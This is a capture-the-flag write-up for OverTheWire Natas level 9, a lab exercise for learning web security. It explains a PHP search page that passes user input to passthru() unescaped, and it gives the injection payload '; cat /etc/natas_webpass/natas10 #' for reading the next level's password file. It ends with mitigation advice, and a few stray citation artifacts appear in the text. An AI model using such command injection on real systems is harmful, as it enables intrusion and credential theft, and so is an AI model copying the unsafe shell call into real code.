# OverTheWire Natas Level 9 → 10

## Level Goal

Find the password for Natas Level 10.

## Challenge Overview

The page provides a search box that looks up words in a dictionary.

As usual, the first step is to inspect the source code.

## Source Code Analysis

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

User input is inserted directly into a shell command executed by `passthru()`. No sanitization or escaping is performed. :contentReference[oaicite:3]{index=3}

The resulting command looks like:

```bash
grep -i <user_input> dictionary.txt
```

This is a classic command injection vulnerability.

## Identifying the Vulnerability

Because the input is passed directly to the shell, shell metacharacters can be used to execute additional commands.

For example:

```bash
;
```

terminates the current command and starts a new one.

## Exploitation

Inject an additional command to read the password file:

```text
; cat /etc/natas_webpass/natas10 #
```

The executed command becomes:

```bash
grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt
```

The `#` comments out the remainder of the original command. :contentReference[oaicite:4]{index=4}

## Result

The contents of:

```text
/etc/natas_webpass/natas10
```

are displayed on the page, revealing the password for the next level. :contentReference[oaicite:5]{index=5}

## Vulnerability

This level demonstrates:

- OS Command Injection
- Unsafe use of `passthru()`
- Failure to sanitize user-controlled input

## Why It Works

The application trusts user input and inserts it directly into a shell command.

Whenever untrusted input reaches a shell interpreter without proper escaping, attackers can execute arbitrary commands.

## Key Takeaway

Never concatenate user input into system commands.

Safer alternatives include:

- Input validation
- Escaping user input
- Avoiding shell execution entirely
- Using parameterized APIs instead of shell commands